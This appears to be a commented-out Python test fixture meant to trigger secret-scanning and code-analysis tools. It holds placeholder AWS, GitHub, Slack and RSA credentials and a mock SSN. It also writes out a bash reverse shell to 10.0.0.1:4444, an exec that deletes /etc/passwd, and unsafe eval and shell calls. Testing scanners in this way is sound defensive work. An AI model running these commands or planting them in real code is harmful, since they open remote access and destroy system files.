# # ============================================================
# # TEST FILE: malicious.py
# # Scanners targeted: Secret Scanner + AST Scanner
# # ============================================================

# import os
# import subprocess

# # --- SECRET SCANNER TRIGGERS ---

# # 1. AWS Access Key ID (HIGH)
# AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'

# # 2. GitHub Personal Access Token (CRITICAL)
# GITHUB_TOKEN = 'ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890'

# # 3. RSA Private Key header (CRITICAL)
# PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
# MIIEowIBAAKCAQEA2a2rwplBQLzHPZe5RJt9qqSF3PbVqBGBBMGVeHVj2bEKhVMm
# -----END RSA PRIVATE KEY-----"""

# # 4. Generic hardcoded password (MEDIUM)
# db_password = "supersecretpassword123"

# # 5. Hardcoded internal IP (SSRF risk) (MEDIUM)
# INTERNAL_API = "http://10.0.0.45/internal/api"

# # 6. Hardcoded SSN in mock data (HIGH - PII)
# TEST_USER_SSN = "123-45-6789"

# # 7. Hardcoded UUID — business logic bypass (LOW)
# ADMIN_BYPASS_TOKEN = "550e8400-e29b-41d4-a716-446655440000"

# # 8. Slack Bot Token (HIGH)
# SLACK_TOKEN = "xoxb-1234567890123-1234567890123-abcdefghijklmnopqrstuvwx"

# # --- AST SCANNER TRIGGERS ---

# # 9. Dangerous os.system call with reverse shell (HIGH)
# os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

# # 10. eval() with dynamic code (HIGH)
# user_input = "print('pwned')"
# eval(user_input)

# # 11. exec() call (HIGH)
# exec("import os; os.remove('/etc/passwd')")

# # 12. subprocess call to shell (HIGH)
# subprocess.call("whoami", shell=True)
